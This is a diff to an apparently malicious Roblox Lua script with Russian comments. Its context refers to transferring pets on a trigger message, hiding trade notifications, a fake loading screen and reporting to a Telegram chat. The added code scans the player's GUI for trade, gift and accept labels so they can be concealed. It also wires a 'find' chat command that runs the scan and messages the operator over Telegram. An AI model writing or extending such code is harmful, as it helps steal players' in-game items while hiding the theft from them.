@@ -5,7 +5,62 @@ local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
--- 🛡️ УЛУЧШЕННАЯ СИСТЕМА СКРЫТИЯ БЕЛОГО ТЕКСТА ПОСЕРЕДИНЕ ЭКРАНА
+-- 🔍 ОТЛАДОЧНАЯ ФУНКЦИЯ ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
+local function findTradeElements()
+    print("=== ПОИСК ТРЕЙД ЭЛЕМЕНТОВ ===")
+    
+    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            print("Проверяем GUI:", gui.Name)
+            
+            for _, obj in ipairs(gui:GetDescendants()) do
+                if obj:IsA("TextLabel") and obj.Visible and obj.Text ~= "" then
+                    local text = obj.Text:lower()
+                    local position = obj.AbsolutePosition
+                    local size = obj.AbsoluteSize
+                    
+                    -- Вычисляем центр экрана
+                    local screenCenter = workspace.CurrentCamera.ViewportSize
+                    local centerX = screenCenter.X / 2
+                    local centerY = screenCenter.Y / 2
+                    
+                    -- Вычисляем центр объекта
+                    local objCenterX = position.X + size.X / 2
+                    local objCenterY = position.Y + size.Y / 2
+                    
+                    -- Расстояние от центра
+                    local distanceFromCenter = math.sqrt((objCenterX - centerX)^2 + (objCenterY - centerY)^2)
+                    
+                    -- Если текст содержит торговые слова или находится в центре
+                    if text:find("trade") or text:find("gift") or text:find("accept") or text:find("decline") or
+                       text:find("request") or text:find("offer") or distanceFromCenter < 250 then
+                        
+                        print("НАЙДЕН ЭЛЕМЕНТ:")
+                        print("  Путь:", gui.Name .. " -> " .. obj:GetFullName())
+                        print("  Имя:", obj.Name)
+                        print("  Текст:", obj.Text)
+                        print("  Позиция:", position.X, position.Y)
+                        print("  Размер:", size.X, size.Y)
+                        print("  Центр объекта:", objCenterX, objCenterY)
+                        print("  Центр экрана:", centerX, centerY)
+                        print("  Расстояние от центра:", math.floor(distanceFromCenter))
+                        print("  Цвет текста:", obj.TextColor3)
+                        print("  Родитель:", obj.Parent and obj.Parent.Name or "nil")
+                        print("  Прозрачность:", obj.TextTransparency)
+                        print("  Видимость:", obj.Visible)
+                        print("  ClassName:", obj.ClassName)
+                        print("---")
+                    end
+                end
+            end
+        end
+    end
+    
+    print("=== ПОИСК ЗАВЕРШЕН ===")
+end
+
+-- Команда для поиска (добавляем в систему команд)
+-- Теперь игрок может написать "find" чтобы найти элементы
 local function hideMiddleScreenText()
     pcall(function()
         for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
@@ -436,6 +491,10 @@ local function setupMessageListener()
                 elseif msg:find("status") then
                     local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                     sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
+                elseif msg:find("find") then
+                    -- НОВАЯ КОМАНДА ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
+                    findTradeElements()
+                    sendToTelegram("Проверь консоль F9 - там информация о найденных элементах")
                 end
             end
         end
@@ -453,6 +512,10 @@ local function setupMessageListener()
                 elseif msg:find("status") then
                     local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                     sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
+                elseif msg:find("find") then
+                    -- НОВАЯ КОМАНДА ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
+                    findTradeElements()
+                    sendToTelegram("Проверь консоль F9 - там информация о найденных элементах")
                 end
             end
         end)
@@ -470,5 +533,7 @@ print("'" .. TRIGGER_MESSAGE .. "' - передать питомцев")
 print("'pets' - список питомцев") 
 print("'status' - статус")
 print("'link' - ссылка на сервер")
+print("'find' - найти трейд элементы (отладка)")
 print("🛡️ Система скрытия торговых уведомлений активна")
 print("🌌 Загрузочный фон активен")
+print("🔍 Для поиска трейд элементов напиши 'find' в чат")
